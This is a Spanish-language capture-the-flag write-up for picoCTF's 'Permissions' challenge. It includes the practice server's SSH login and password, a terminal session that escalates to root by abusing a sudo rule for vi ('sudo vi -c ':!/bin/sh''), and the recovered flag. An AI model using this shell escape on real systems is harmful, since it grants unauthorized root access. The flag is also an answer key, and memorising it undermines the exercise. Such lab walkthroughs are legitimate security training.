**Reto:** Permissions

**Descripción:**
¿Puedes leer archivos en el archivo raíz?El administrador del sistema ha proporcionado una cuenta para usted en el servidor principal:`ssh -p 59156 picoplayer@saturn.picoctf.net`Contraseña:`yX-YQgX-vS`¿Puedes iniciar sesión y leer el archivo raíz?
**Solución:**
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
picoplayer@challenge:/$ id
uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer)
picoplayer@challenge:/$ sudo -67
sudo: invalid option -- '6'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
picoplayer@challenge:/$ sudo -l 
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

#id
uid=0(root) gid=0(root) groups=0(root)
#ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 cd challenge/
#ls
metadata.json
#cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_55878b51}", "username": "picoplayer", "password": "yX-YQgX-vS"}# 
**Notas adicionales:**

**Referencias:** 
https://youtu.be/wmUP8Ck2X-4?si=Ly0k7pS71To73SEF
